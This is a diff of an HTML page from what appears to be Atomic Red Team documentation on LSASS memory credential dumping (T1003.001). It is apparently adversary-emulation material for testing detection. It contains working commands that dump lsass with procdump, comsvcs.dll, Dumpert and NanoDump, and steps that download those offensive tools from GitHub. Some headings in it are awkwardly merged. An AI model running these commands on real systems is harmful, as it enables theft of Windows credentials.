@@ -5646,7 +5659,7 @@ title="Print to PDF"
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id23">
+      <a class="reference internal nav-link" href="#id26">
        Dependencies:  Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -5657,24 +5670,24 @@ title="Print to PDF"
       </a>
       <ul class="nav section-nav flex-column">
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id24">
+        <a class="reference internal nav-link" href="#id27">
          Description: ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id25">
+        <a class="reference internal nav-link" href="#id28">
          Check Prereq Commands:
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id26">
+        <a class="reference internal nav-link" href="#id29">
          Get Prereq Commands:
         </a>
        </li>
       </ul>
      </li>
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id27">
+      <a class="reference internal nav-link" href="#id30">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -5683,24 +5696,17 @@ title="Print to PDF"
        </code>
       </a>
      </li>
-    </ul>
-   </li>
-   <li class="toc-h3 nav-item toc-entry">
-    <a class="reference internal nav-link" href="#atomic-test-10-powershell-mimikatz">
-     Atomic Test #10 - Powershell Mimikatz
-    </a>
-    <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id28">
-       Attack Commands: Run with
-       <code class="docutils literal notranslate">
-        <span class="pre">
-         powershell
-        </span>
-       </code>
+      <a class="reference internal nav-link" href="#id31">
+       Cleanup:
       </a>
      </li>
     </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-10-powershell-mimikatzdumps-credentials-from-memory-via-powershell-by-invoking-a-remote-mimikatz-script">
+     Atomic Test #10 - Powershell MimikatzDumps credentials from memory via Powershell by invoking a remote mimikatz script.
+    </a>
    </li>
    <li class="toc-h3 nav-item toc-entry">
     <a class="reference internal nav-link" href="#atomic-test-11-dump-lsass-with-createdump-exe-from-net-v5">
@@ -5708,7 +5714,7 @@ title="Print to PDF"
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id29">
+      <a class="reference internal nav-link" href="#id32">
        Dependencies:  Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -5724,51 +5730,6 @@ title="Print to PDF"
         </a>
        </li>
        <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id30">
-         Check Prereq Commands:
-        </a>
-       </li>
-       <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#id31">
-         Get Prereq Commands:
-        </a>
-       </li>
-      </ul>
-     </li>
-     <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id32">
-       Attack Commands: Run with
-       <code class="docutils literal notranslate">
-        <span class="pre">
-         powershell
-        </span>
-       </code>
-      </a>
-     </li>
-    </ul>
-   </li>
-   <li class="toc-h3 nav-item toc-entry">
-    <a class="reference internal nav-link" href="#atomic-test-12-dump-lsass-exe-using-imported-microsoft-dlls">
-     Atomic Test #12 - Dump LSASS.exe using imported Microsoft DLLs
-    </a>
-    <ul class="nav section-nav flex-column">
-     <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#dependencies-run-with-none">
-       Dependencies:  Run with
-       <code class="docutils literal notranslate">
-        <span class="pre">
-         None
-        </span>
-       </code>
-       !
-      </a>
-      <ul class="nav section-nav flex-column">
-       <li class="toc-h5 nav-item toc-entry">
-        <a class="reference internal nav-link" href="#description-computer-must-have-xordump-exe">
-         Description: Computer must have xordump.exe
-        </a>
-       </li>
-       <li class="toc-h5 nav-item toc-entry">
         <a class="reference internal nav-link" href="#id33">
          Check Prereq Commands:
         </a>
@@ -5781,13 +5742,68 @@ title="Print to PDF"
       </ul>
      </li>
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id35">
+      <a class="reference internal nav-link" href="#attack-commands-run-with-powershell">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
          powershell
         </span>
        </code>
+      </a>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id35">
+       Cleanup:
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-12-dump-lsass-exe-using-imported-microsoft-dlls">
+     Atomic Test #12 - Dump LSASS.exe using imported Microsoft DLLs
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id36">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-computer-must-have-xordump-exe">
+         Description: Computer must have xordump.exe
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id37">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id38">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id39">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+      </a>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id40">
+       Cleanup:
       </a>
      </li>
     </ul>
@@ -5809,8 +5825,8 @@ title="Print to PDF"
                 
               <div>
                 
-  <section class="tex2jax_ignore mathjax_ignore" id="t1003-001-os-credential-dumping-lsass-memory">
-<h1>T1003.001 - OS Credential Dumping: LSASS Memory<a class="headerlink" href="#t1003-001-os-credential-dumping-lsass-memory" title="Permalink to this headline">#</a></h1>
+  <section class="tex2jax_ignore mathjax_ignore" id="t1003-001-lsass-memory">
+<h1>T1003.001 - LSASS Memory<a class="headerlink" href="#t1003-001-lsass-memory" title="Permalink to this headline">#</a></h1>
 <p>Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct <a class="reference external" href="https://attack.mitre.org/tactics/TA0008">Lateral Movement</a> using <a class="reference external" href="https://attack.mitre.org/techniques/T1550">Use Alternate Authentication Material</a>.</p>
 <p>As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.</p>
 <p>For example, on the target host use procdump:</p>
@@ -5842,8 +5858,8 @@ title="Print to PDF"
 ProcDump.</p>
 <p>Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.</p>
 <p>If you see a message saying “procdump.exe is not recognized as an internal or external command”, try using the  get-prereq_commands to download and install the ProcDump tool first.</p>
-<p><strong>Supported Platforms:</strong> windows
-Elevation Required (e.g. root or admin)</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<p>Elevation Required (e.g. root or admin)</p>
 <section id="dependencies-run-with-powershell">
 <h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#dependencies-run-with-powershell" title="Permalink to this headline">#</a></h4>
 <section id="description-procdump-tool-from-sysinternals-must-exist-on-disk-at-specified-location-procdump-exe">
@@ -5851,17 +5867,19 @@ Elevation Required (e.g. root or admin)</p>
 </section>
 <section id="check-prereq-commands">
 <h5>Check Prereq Commands:<a class="headerlink" href="#check-prereq-commands" title="Permalink to this headline">#</a></h5>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1003</span><span class="p">.</span><span class="n">001</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">procdump</span><span class="p">.</span><span class="n">exe</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>if (Test-Path PathToAtomicsFolder\T1003.001\bin\procdump.exe) {exit 0} else {exit 1}
+
 </pre></div>
 </div>
 </section>
 <section id="get-prereq-commands">
 <h5>Get Prereq Commands:<a class="headerlink" href="#get-prereq-commands" title="Permalink to this headline">#</a></h5>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="no">[Net.ServicePointManager]</span><span class="p">::</span><span class="n">SecurityProtocol</span> <span class="p">=</span> <span class="no">[Net.SecurityProtocolType]</span><span class="p">::</span><span class="n">Tls12</span>
-<span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://download.sysinternals.com/files/Procdump.zip&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;$env:TEMP\Procdump.zip&quot;</span>
-<span class="nb">Expand-Archive</span> <span class="nv">$env:TEMP</span><span class="p">\</span><span class="n">Procdump</span><span class="p">.</span><span class="n">zip</span> <span class="nv">$env:TEMP</span><span class="p">\</span><span class="n">Procdump</span> <span class="n">-Force</span>
-<span class="nb">New-Item</span> <span class="n">-ItemType</span> <span class="n">Directory</span> <span class="p">(</span><span class="nb">Split-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1003</span><span class="p">.</span><span class="n">001</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">procdump</span><span class="p">.</span><span class="n">exe</span><span class="p">)</span> <span class="n">-Force</span> <span class="p">|</span> <span class="nb">Out-Null</span>
-<span class="nb">Copy-Item</span> <span class="nv">$env:TEMP</span><span class="p">\</span><span class="n">Procdump</span><span class="p">\</span><span class="n">Procdump</span><span class="p">.</span><span class="n">exe</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1003</span><span class="p">.</span><span class="n">001</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">procdump</span><span class="p">.</span><span class="n">exe</span> <span class="n">-Force</span>
+<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+Invoke-WebRequest &quot;https://download.sysinternals.com/files/Procdump.zip&quot; -OutFile &quot;$env:TEMP\Procdump.zip&quot;
+Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
+New-Item -ItemType Directory (Split-Path PathToAtomicsFolder\T1003.001\bin\procdump.exe) -Force | Out-Null
+Copy-Item $env:TEMP\Procdump\Procdump.exe PathToAtomicsFolder\T1003.001\bin\procdump.exe -Force
+
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -5886,21 +5904,43 @@ Elevation Required (e.g. root or admin)</p>
 </div>
 </div>
 </section>
+<section id="cleanup">
+<h4>Cleanup:<a class="headerlink" href="#cleanup" title="Permalink to this headline">#</a></h4>
+<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>del &quot;C:\Windows\Temp\lsass_dump.dmp&quot; &gt;nul 2&gt; nul
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1003</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">1</span> <span class="n">-Cleanup</span>
+</pre></div>
+</div>
+</div>
+</div>
 </section>
-<section id="atomic-test-2-dump-lsass-exe-memory-using-comsvcs-dll">
-<h3>Atomic Test #2 - Dump LSASS.exe Memory using comsvcs.dll<a class="headerlink" href="#atomic-test-2-dump-lsass-exe-memory-using-comsvcs-dll" title="Permalink to this headline">#</a></h3>
-<p>The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.</p>
-<p>Upon successful execution, you should see the following file created $env:TEMP\lsass-comsvcs.dmp.</p>
-<p><strong>Supported Platforms:</strong> windows
-Elevation Required (e.g. root or admin)</p>
-<section id="attack-commands-run-with-powershell">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">#</a></h4>
+</section>
+<section id="atomic-test-2-dump-lsass-exe-memory-using-comsvcs-dllthe-memory-of-lsass-exe-is-often-dumped-for-offline-credential-theft-attacks-this-can-be-achieved-with-a-built-in-dll">
+<h3>Atomic Test #2 - Dump LSASS.exe Memory using comsvcs.dllThe memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.<a class="headerlink" href="#atomic-test-2-dump-lsass-exe-memory-using-comsvcs-dllthe-memory-of-lsass-exe-is-often-dumped-for-offline-credential-theft-attacks-this-can-be-achieved-with-a-built-in-dll" title="Permalink to this headline">#</a></h3>
+<p>Upon successful execution, you should see the following file created $env:TEMP\lsass-comsvcs.dmp.
+<strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></p>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">rundll32</span><span class="p">.</span><span class="n">exe</span> <span class="n">C</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">comsvcs</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span> <span class="n">MiniDump</span> <span class="p">(</span><span class="nb">Get-Process</span> <span class="n">lsass</span><span class="p">).</span><span class="n">id</span> <span class="nv">$env:TEMP</span><span class="p">\</span><span class="n">lsass-comsvcs</span><span class="p">.</span><span class="n">dmp</span> <span class="n">full</span>
 </pre></div>
 </div>
 <div class="cell docutils container">
 <div class="cell_input docutils container">
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1003</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">2</span>
+</pre></div>
+</div>
+</div>
+</div>
+<section id="id1">
+<h4>Cleanup:<a class="headerlink" href="#id1" title="Permalink to this headline">#</a></h4>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Remove-Item</span> <span class="nv">$env:TEMP</span><span class="p">\</span><span class="n">lsass-comsvcs</span><span class="p">.</span><span class="n">dmp</span> <span class="n">-ErrorAction</span> <span class="n">Ignore</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1003</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">2</span> <span class="n">-Cleanup</span>
 </pre></div>
 </div>
 </div>
@@ -5914,24 +5954,26 @@ Elevation Required (e.g. root or admin)</p>
 <a class="reference external" href="https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/">https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/</a>
 Upon successful execution, you should see the following file created C:\windows\temp\dumpert.dmp.</p>
 <p>If you see a message saying “The system cannot find the path specified.”, try using the  get-prereq_commands to download the  tool first.</p>
-<p><strong>Supported Platforms:</strong> windows
-Elevation Required (e.g. root or admin)</p>
-<section id="id1">
-<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id1" title="Permalink to this headline">#</a></h4>
+<p><strong>Supported Platforms:</strong> windows</p>
+<p>Elevation Required (e.g. root or admin)</p>
+<section id="id2">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id2" title="Permalink to this headline">#</a></h4>
 <section id="description-dumpert-executable-must-exist-on-disk-at-specified-location-dumpert-exe">
 <h5>Description: Dumpert executable must exist on disk at specified location (#{dumpert_exe})<a class="headerlink" href="#description-dumpert-executable-must-exist-on-disk-at-specified-location-dumpert-exe" title="Permalink to this headline">#</a></h5>
 </section>
-<section id="id2">
-<h5>Check Prereq Commands:<a class="headerlink" href="#id2" title="Permalink to this headline">#</a></h5>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1003</span><span class="p">.</span><span class="n">001</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">Outflank-Dumpert</span><span class="p">.</span><span class="n">exe</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+<section id="id3">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id3" title="Permalink to this headline">#</a></h5>
+<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>if (Test-Path PathToAtomicsFolder\T1003.001\bin\Outflank-Dumpert.exe) {exit 0} else {exit 1}
+
 </pre></div>
 </div>
 </section>
-<section id="id3">
-<h5>Get Prereq Commands:<a class="headerlink" href="#id3" title="Permalink to this headline">#</a></h5>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="no">[Net.ServicePointManager]</span><span class="p">::</span><span class="n">SecurityProtocol</span> <span class="p">=</span> <span class="no">[Net.SecurityProtocolType]</span><span class="p">::</span><span class="n">Tls12</span>
-<span class="nb">New-Item</span> <span class="n">-ItemType</span> <span class="n">Directory</span> <span class="p">(</span><span class="nb">Split-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1003</span><span class="p">.</span><span class="n">001</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">Outflank-Dumpert</span><span class="p">.</span><span class="n">exe</span><span class="p">)</span> <span class="n">-Force</span> <span class="p">|</span> <span class="nb">Out-Null</span>
-<span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe&quot;</span> <span class="n">-OutFile</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1003</span><span class="p">.</span><span class="n">001</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">Outflank-Dumpert</span><span class="p">.</span><span class="n">exe</span>
+<section id="id4">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id4" title="Permalink to this headline">#</a></h5>
+<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+New-Item -ItemType Directory (Split-Path PathToAtomicsFolder\T1003.001\bin\Outflank-Dumpert.exe) -Force | Out-Null
+Invoke-WebRequest &quot;https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe&quot; -OutFile PathToAtomicsFolder\T1003.001\bin\Outflank-Dumpert.exe
+
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -5943,8 +5985,8 @@ Elevation Required (e.g. root or admin)</p>
 </div>
 </section>
 </section>
-<section id="id4">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id4" title="Permalink to this headline">#</a></h4>
+<section id="id5">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id5" title="Permalink to this headline">#</a></h4>
 <div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>PathToAtomicsFolder\T1003.001\bin\Outflank-Dumpert.exe
 </pre></div>
 </div>
@@ -5956,29 +5998,44 @@ Elevation Required (e.g. root or admin)</p>
 </div>
 </div>
 </section>
+<section id="id6">
+<h4>Cleanup:<a class="headerlink" href="#id6" title="Permalink to this headline">#</a></h4>
+<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>del C:\windows\temp\dumpert.dmp &gt;nul 2&gt; nul
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1003</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">3</span> <span class="n">-Cleanup</span>
+</pre></div>
+</div>
+</div>
+</div>
+</section>
 </section>
 <section id="atomic-test-4-dump-lsass-exe-memory-using-nanodump">
 <h3>Atomic Test #4 - Dump LSASS.exe Memory using NanoDump<a class="headerlink" href="#atomic-test-4-dump-lsass-exe-memory-using-nanodump" title="Permalink to this headline">#</a></h3>
 <p>The NanoDump tool uses syscalls and an invalid dump signature to avoid detection.</p>
 <p><a class="reference external" href="https://github.com/helpsystems/nanodump">https://github.com/helpsystems/nanodump</a></p>
 <p>Upon successful execution, you should find the nanondump.dmp file in the temp directory</p>
-<p><strong>Supported Platforms:</strong> windows
-Elevation Required (e.g. root or admin)</p>
-<section id="id5">
-<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id5" title="Permalink to this headline">#</a></h4>
+<p><strong>Supported Platforms:</strong> windows</p>
+<p>Elevation Required (e.g. root or admin)</p>
+<section id="id7">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id7" title="Permalink to this headline">#</a></h4>
 <section id="description-nanodump-executable-must-exist-on-disk-at-specified-location-env-temp-nanodump-x64-exe">
 <h5>Description: NanoDump executable must exist on disk at specified location ($env:TEMP\nanodump.x64.exe)<a class="headerlink" href="#description-nanodump-executable-must-exist-on-disk-at-specified-location-env-temp-nanodump-x64-exe" title="Permalink to this headline">#</a></h5>
 </section>
-<section id="id6">
-<h5>Check Prereq Commands:<a class="headerlink" href="#id6" title="Permalink to this headline">#</a></h5>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="nv">$env:TEMP</span><span class="p">\</span><span class="n">nanodump</span><span class="p">.</span><span class="n">x64</span><span class="p">.</span><span class="n">exe</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+<section id="id8">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id8" title="Permalink to this headline">#</a></h5>
+<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>if (Test-Path $env:TEMP\nanodump.x64.exe) {exit 0} else {exit 1}
+
 </pre></div>
 </div>
 </section>
-<section id="id7">
-<h5>Get Prereq Commands:<a class="headerlink" href="#id7" title="Permalink to this headline">#</a></h5>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="no">[Net.ServicePointManager]</span><span class="p">::</span><span class="n">SecurityProtocol</span> <span class="p">=</span> <span class="no">[Net.SecurityProtocolType]</span><span class="p">::</span><span class="n">Tls12</span>
-<span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://github.com/helpsystems/nanodump/raw/84db0c1737bbe027431733c193cfacf59a07259b/compiled/nanodump.x64.exe&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;$env:TEMP\nanodump.x64.exe&quot;</span>
+<section id="id9">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id9" title="Permalink to this headline">#</a></h5>
+<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+Invoke-WebRequest &quot;https://github.com/helpsystems/nanodump/raw/84db0c1737bbe027431733c193cfacf59a07259b/compiled/nanodump.x64.exe&quot; -OutFile &quot;$env:TEMP\nanodump.x64.exe&quot;
+
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -5990,8 +6047,8 @@ Elevation Required (e.g. root or admin)</p>
 </div>
 </section>
 </section>
-<section id="id8">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id8" title="Permalink to this headline">#</a></h4>
+<section id="id10">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id10" title="Permalink to this headline">#</a></h4>
 <div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>%temp%\nanodump.x64.exe -w &quot;%temp%\nanodump.dmp&quot;
 </pre></div>
 </div>
@@ -6003,17 +6060,27 @@ Elevation Required (e.g. root or admin)</p>
 </div>
 </div>
 </section>
+<section id="id11">
+<h4>Cleanup:<a class="headerlink" href="#id11" title="Permalink to this headline">#</a></h4>
+<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>del &quot;%temp%\nanodump.dmp&quot; &gt;nul 2&gt; nul
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1003</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">4</span> <span class="n">-Cleanup</span>
+</pre></div>
+</div>
+</div>
+</div>
 </section>
-<section id="atomic-test-5-dump-lsass-exe-memory-using-windows-task-manager">
-<h3>Atomic Test #5 - Dump LSASS.exe Memory using Windows Task Manager<a class="headerlink" href="#atomic-test-5-dump-lsass-exe-memory-using-windows-task-manager" title="Permalink to this headline">#</a></h3>
-<p>The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task
-Manager and administrative permissions.</p>
-<p><strong>Supported Platforms:</strong> windows
-Run it with these steps!</p>
-<ol class="simple">
-<li><p>Open Task Manager:
+</section>
+<section id="atomic-test-5-dump-lsass-exe-memory-using-windows-task-managerthe-memory-of-lsass-exe-is-often-dumped-for-offline-credential-theft-attacks-this-can-be-achieved-with-the-windows-task">
+<h3>Atomic Test #5 - Dump LSASS.exe Memory using Windows Task ManagerThe memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task<a class="headerlink" href="#atomic-test-5-dump-lsass-exe-memory-using-windows-task-managerthe-memory-of-lsass-exe-is-often-dumped-for-offline-credential-theft-attacks-this-can-be-achieved-with-the-windows-task" title="Permalink to this headline">#</a></h3>
+<p>Manager and administrative permissions.
+<strong>Supported Platforms:</strong> windowsRun it with these steps!1. Open Task Manager:
 On a Windows system this can be accomplished by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking
-on the task bar and selecting “Task Manager”.</p></li>
+on the task bar and selecting “Task Manager”.</p>
+<ol class="simple">
 <li><p>Select lsass.exe:
 If lsass.exe is not visible, select “Show processes from all users”. This will allow you to observe execution of lsass.exe
 and select it for manipulation.</p></li>
@@ -6025,42 +6092,46 @@ Right-click on lsass.exe in Task Manager. Select “Create Dump File”. The fol
 <h3>Atomic Test #6 - Offline Credential Theft With Mimikatz<a class="headerlink" href="#atomic-test-6-offline-credential-theft-with-mimikatz" title="Permalink to this headline">#</a></h3>
 <p>The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with
 Mimikatz. This tool is available at <a class="reference external" href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a> and can be obtained using the get-prereq_commands.</p>
-<p><strong>Supported Platforms:</strong> windows
-Elevation Required (e.g. root or admin)</p>
-<section id="id9">
-<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id9" title="Permalink to this headline">#</a></h4>
+<p><strong>Supported Platforms:</strong> windows</p>
+<p>Elevation Required (e.g. root or admin)</p>
+<section id="id12">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id12" title="Permalink to this headline">#</a></h4>
 <section id="description-mimikatz-must-exist-on-disk-at-specified-location-mimikatz-exe">
 <h5>Description: Mimikatz must exist on disk at specified location (#{mimikatz_exe})<a class="headerlink" href="#description-mimikatz-must-exist-on-disk-at-specified-location-mimikatz-exe" title="Permalink to this headline">#</a></h5>
 </section>
-<section id="id10">
-<h5>Check Prereq Commands:<a class="headerlink" href="#id10" title="Permalink to this headline">#</a></h5>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1003</span><span class="p">.</span><span class="n">001</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">x64</span><span class="p">\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+<section id="id13">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id13" title="Permalink to this headline">#</a></h5>
